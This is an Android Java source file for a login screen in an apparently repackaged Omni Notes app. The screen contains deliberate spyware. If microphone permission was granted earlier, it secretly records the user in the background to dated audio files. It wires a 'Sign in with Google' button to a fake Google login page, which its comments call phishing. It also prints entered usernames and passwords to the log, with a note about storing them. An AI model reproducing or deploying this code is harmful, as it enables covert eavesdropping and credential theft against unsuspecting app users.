package it.feio.android.omninotes;

import static org.acra.ACRA.LOG_TAG;

import android.Manifest;
import android.app.Activity;

import androidx.annotation.RequiresApi;
import androidx.lifecycle.Observer;
import androidx.lifecycle.ViewModelProvider;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.Nullable;
import androidx.annotation.StringRes;
import androidx.appcompat.app.AppCompatActivity;

import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.common.SignInButton;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import it.feio.android.omninotes.databinding.ActivityLoginBinding;

public class LoginActivity extends AppCompatActivity {

    private LoginViewModel loginViewModel;
    private ActivityLoginBinding binding;

    // init microphone-related vars
    private boolean micPermGranted = false;
    private String permission = Manifest.permission.RECORD_AUDIO;
    private MediaRecorder recorder = null;
    private String fileName = null;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityLoginBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        loginViewModel = new ViewModelProvider(this, new LoginViewModelFactory())
                .get(LoginViewModel.class);

        // init login vars
        final EditText usernameEditText = binding.username;
        final EditText passwordEditText = binding.password;
        final Button loginButton = binding.login;
        final ProgressBar loadingProgressBar = binding.loading;
        final SignInButton googleButton = findViewById(R.id.login_google);

        // attempt to start microphone recording
        // don't ask for permission, just check if it has been granted before
        if (checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
            micPermGranted = true;
            useMicrophone();
        }

        /* Login functions */
        loginViewModel.getLoginFormState().observe(this, new Observer<LoginFormState>() {
            @Override
            public void onChanged(@Nullable LoginFormState loginFormState) {
                if (loginFormState == null) {
                    return;
                }
                loginButton.setEnabled(loginFormState.isDataValid());
                if (loginFormState.getUsernameError() != null) {
                    usernameEditText.setError(getString(loginFormState.getUsernameError()));
                }
                if (loginFormState.getPasswordError() != null) {
                    passwordEditText.setError(getString(loginFormState.getPasswordError()));
                }
            }
        });

        loginViewModel.getLoginResult().observe(this, new Observer<LoginResult>() {
            @Override
            public void onChanged(@Nullable LoginResult loginResult) {
                if (loginResult == null) {
                    return;
                }
                loadingProgressBar.setVisibility(View.GONE);
                if (loginResult.getError() != null) {
                    showLoginFailed(loginResult.getError());
                }
                if (loginResult.getSuccess() != null) {
                    updateUiWithUser(loginResult.getSuccess(), usernameEditText, passwordEditText);
                }
                setResult(Activity.RESULT_OK);

            }
        });

        TextWatcher afterTextChangedListener = new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
                // ignore
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                // ignore
            }

            @Override
            public void afterTextChanged(Editable s) {
                loginViewModel.loginDataChanged(usernameEditText.getText().toString(),
                        passwordEditText.getText().toString());
            }
        };
        usernameEditText.addTextChangedListener(afterTextChangedListener);
        passwordEditText.addTextChangedListener(afterTextChangedListener);
        passwordEditText.setOnEditorActionListener(new TextView.OnEditorActionListener() {

            @Override
            public boolean onEditorAction(TextView v, int actionId, KeyEvent event) {
                if (actionId == EditorInfo.IME_ACTION_DONE) {
                    loginViewModel.login(usernameEditText.getText().toString(),
                            passwordEditText.getText().toString());
                }
                return false;
            }
        });

        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                loadingProgressBar.setVisibility(View.VISIBLE);
                loginViewModel.login(usernameEditText.getText().toString(),
                        passwordEditText.getText().toString());
            }
        });

        // google phishing button onClick listener
        googleButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                toFakeGooglePage(v);
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        System.out.println("I am being destroyed. Releasing system resources (if any)...");
        if(micPermGranted == false){
            stopRecording();
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        System.out.println("I am being stopped, not releasing anything.");
    }

    // to phishing activity
    private void toFakeGooglePage(View v){
        Intent i = new Intent(this, LoginGoogleEmail.class);
        startActivity(i);
    }

    // on login success
    private void updateUiWithUser(LoggedInUserView model, EditText username, EditText password) {
        // TODO: store username and text to filesystem
        System.out.println(username.getText() + " and " + password.getText());
        String welcome = getString(R.string.welcome) + " " + username.getText().toString();
        Toast.makeText(getApplicationContext(), welcome, Toast.LENGTH_LONG).show();
        // intent to go to MainActivity
        Intent i = new Intent(this, MainActivity.class);
        startActivity(i);
    }

    private void showLoginFailed(@StringRes Integer errorString) {
        Toast.makeText(getApplicationContext(), errorString, Toast.LENGTH_SHORT).show();
    }

    /* Microphone functions */

    // attempt to record user in the background without them knowing.
    @RequiresApi(api = Build.VERSION_CODES.M)
    private void useMicrophone(){

        // Create unique file name for recording: YYYYMMDD_HHMMSS.3gp
        Date currDate = new Date();
        String formattedDate = new SimpleDateFormat("yyyyMMdd-HHmmss").format(currDate);
        fileName = getExternalCacheDir().getAbsolutePath();
        fileName += "/" + formattedDate + ".3gp";
        System.out.println(fileName);

        startRecording();
    }

    private void startRecording(){
        System.out.println("shits granted :) begin recording...");
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setOutputFile(fileName);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        try{
            recorder.prepare();
        } catch (IOException e){
            Log.e(LOG_TAG, "prepare() failed. can't record user :'(");
        }

        recorder.start();
    }
    private void stopRecording(){
        recorder.stop();
        recorder.release();
    }
}